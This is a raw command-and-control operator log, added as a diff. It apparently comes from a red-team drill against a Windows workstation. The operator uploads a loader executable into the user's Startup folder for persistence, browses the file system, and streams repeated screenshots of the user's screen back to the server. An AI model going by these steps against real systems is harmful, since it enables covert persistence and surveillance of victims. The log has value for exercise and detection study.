@@ -1,0 +1,257 @@
+01/07 08:07:41 UTC [metadata] 192.168.43.216 <- 192.168.43.216; computer: DESKTOP-B0D0J2Q; user: ANH KHOA; process: mspaint.exe; pid: 8440; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+01/07 08:07:51 UTC [input] <neo> sleep 10
+01/07 08:07:51 UTC [task] <T1029> Tasked beacon to sleep for 10s
+01/07 08:08:09 UTC [input] <neo> ls
+01/07 08:08:09 UTC [task] <> Tasked beacon to list files in .
+01/07 08:08:39 UTC [checkin] host called home, sent: 35 bytes
+01/07 08:08:39 UTC [output]
+C:\Users\ADMIN\AppData\Local\Temp\RarSFX3\*
+D	0	01/07/2023 15:06:37	.
+D	0	01/07/2023 15:06:37	..
+F	954368	01/07/2023 15:04:47	a.exe
+F	11898	01/06/2023 08:35:50	Test.docx
+
+
+01/07 08:08:45 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+01/07 08:08:49 UTC [checkin] host called home, sent: 19 bytes
+01/07 08:08:52 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\ (from File Browser)
+01/07 08:08:59 UTC [checkin] host called home, sent: 32 bytes
+01/07 08:09:01 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\ (from File Browser)
+01/07 08:09:09 UTC [checkin] host called home, sent: 40 bytes
+01/07 08:09:10 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\ (from File Browser)
+01/07 08:09:19 UTC [checkin] host called home, sent: 48 bytes
+01/07 08:09:20 UTC [input] <neo> sleep 5
+01/07 08:09:20 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/07 08:09:29 UTC [checkin] host called home, sent: 16 bytes
+01/07 08:09:34 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\ (from File Browser)
+01/07 08:09:34 UTC [checkin] host called home, sent: 58 bytes
+01/07 08:09:38 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\ (from File Browser)
+01/07 08:09:39 UTC [checkin] host called home, sent: 66 bytes
+01/07 08:09:42 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\ (from File Browser)
+01/07 08:09:44 UTC [checkin] host called home, sent: 77 bytes
+01/07 08:09:45 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ (from File Browser)
+01/07 08:09:49 UTC [checkin] host called home, sent: 86 bytes
+01/07 08:09:58 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ (from File Browser)
+01/07 08:09:59 UTC [checkin] host called home, sent: 94 bytes
+01/07 08:10:06 UTC [input] <neo> upload /home/kali/Desktop/Shhhloader/a.exe (C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe)
+01/07 08:10:07 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/Shhhloader/a.exe as C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/07 08:10:07 UTC [indicator] file: 30022400c977215b05a8419a562b1a8d 954368 bytes C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/07 08:10:07 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ (from File Browser)
+01/07 08:10:09 UTC [checkin] host called home, sent: 954650 bytes
+01/07 08:10:48 UTC [input] <neo> sleep 10
+01/07 08:10:48 UTC [task] <T1029> Tasked beacon to sleep for 10s
+01/07 08:10:49 UTC [checkin] host called home, sent: 16 bytes
+01/07 08:10:53 UTC [input] <neo> screenwatch
+01/07 08:10:53 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
+01/07 08:10:59 UTC [checkin] host called home, sent: 199780 bytes
+01/07 08:11:01 UTC [output]
+received screenshot of Threat Intelligence - Hu?ng di m?i trong ngành An ninh m?ng | WhiteHat.vn - Sidekick from ANH KHOA (200kb)
+
+01/07 08:11:11 UTC [output]
+received screenshot of Tri?n Khai K?ch B?n Di?n T?p Capstone 1 from ANH KHOA (119kb)
+
+01/07 08:11:21 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (270kb)
+
+01/07 08:11:31 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (303kb)
+
+01/07 08:11:31 UTC [input] <neo> sleep 5
+01/07 08:11:31 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/07 08:11:39 UTC [input] <neo> screenwatch
+01/07 08:11:39 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
+01/07 08:11:41 UTC [checkin] host called home, sent: 199796 bytes
+01/07 08:11:42 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (305kb)
+
+01/07 08:11:57 UTC [input] <neo> screenwatch 5
+01/07 08:11:57 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
+01/07 08:12:02 UTC [checkin] host called home, sent: 199780 bytes
+01/07 08:12:03 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (298kb)
+
+01/07 08:12:39 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (296kb)
+
+01/07 08:12:44 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (300kb)
+
+01/07 08:12:44 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (300kb)
+
+01/07 08:12:44 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:12:49 UTC [output]
+received screenshot of re1 | Splunk 9.0.2 - Sidekick from ANH KHOA (208kb)
+
+01/07 08:12:49 UTC [output]
+received screenshot of re1 | Splunk 9.0.2 - Sidekick from ANH KHOA (206kb)
+
+01/07 08:12:49 UTC [output]
+received screenshot of re1 | Splunk 9.0.2 - Sidekick from ANH KHOA (206kb)
+
+01/07 08:12:51 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+01/07 08:12:54 UTC [checkin] host called home, sent: 12 bytes
+01/07 08:12:54 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (130kb)
+
+01/07 08:12:54 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (128kb)
+
+01/07 08:12:54 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (129kb)
+
+01/07 08:12:59 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (146kb)
+
+01/07 08:12:59 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (146kb)
+
+01/07 08:13:04 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (146kb)
+
+01/07 08:13:09 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (247kb)
+
+01/07 08:13:10 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (190kb)
+
+01/07 08:13:10 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (246kb)
+
+01/07 08:13:15 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:15 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:15 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:20 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:20 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:20 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:25 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:25 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:25 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:30 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:30 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:30 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:36 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:36 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:36 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (302kb)
+
+01/07 08:13:41 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:41 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:41 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:46 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:46 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:46 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (301kb)
+
+01/07 08:13:51 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (309kb)
+
+01/07 08:13:51 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (309kb)
+
+01/07 08:13:51 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (309kb)
+
+01/07 08:13:57 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (304kb)
+
+01/07 08:13:57 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (304kb)
+
+01/07 08:13:57 UTC [output]
+received screenshot of *Wi-Fi from ANH KHOA (304kb)
+
+01/07 08:14:02 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (190kb)
+
+01/07 08:14:02 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (190kb)
+
+01/07 08:14:02 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (190kb)
+
+01/07 08:14:07 UTC [output]
+received screenshot of Process Hacker [DESKTOP-B0D0J2Q\ANH KHOA] from ANH KHOA (194kb)
+
+01/07 08:14:07 UTC [output]
+received screenshot of Process Hacker [DESKTOP-B0D0J2Q\ANH KHOA] from ANH KHOA (194kb)
+
+01/07 08:14:07 UTC [output]
+received screenshot of Process Hacker [DESKTOP-B0D0J2Q\ANH KHOA] from ANH KHOA (194kb)
+
+01/07 08:14:12 UTC [output]
+received screenshot of Ubuntu - VMware Workstation from ANH KHOA (191kb)
+
+01/07 08:14:12 UTC [output]
+received screenshot of Ubuntu - VMware Workstation from ANH KHOA (191kb)
+
+01/07 08:14:12 UTC [output]
+received screenshot of Ubuntu - VMware Workstation from ANH KHOA (191kb)
+
+01/07 08:14:17 UTC [output]
+received screenshot of Ubuntu - VMware Workstation from ANH KHOA (97kb)
+
+01/07 08:14:17 UTC [output]
+received screenshot of Ubuntu - VMware Workstation from ANH KHOA (97kb)
+
+01/07 08:14:17 UTC [output]
+received screenshot of Ubuntu - VMware Workstation from ANH KHOA (97kb)
+
+01/07 08:14:22 UTC [output]
+received screenshot of Program Manager from ANH KHOA (228kb)
+
+01/07 08:14:22 UTC [output]
+received screenshot of Program Manager from ANH KHOA (228kb)
+
+01/07 08:14:22 UTC [output]
+received screenshot of Program Manager from ANH KHOA (228kb)
+
+01/07 08:14:28 UTC [output]
+received screenshot of Start from ANH KHOA (140kb)
+
+01/07 08:14:28 UTC [output]
+received screenshot of Start from ANH KHOA (140kb)
+
+01/07 08:14:28 UTC [output]
+received screenshot of Start from ANH KHOA (140kb)
+
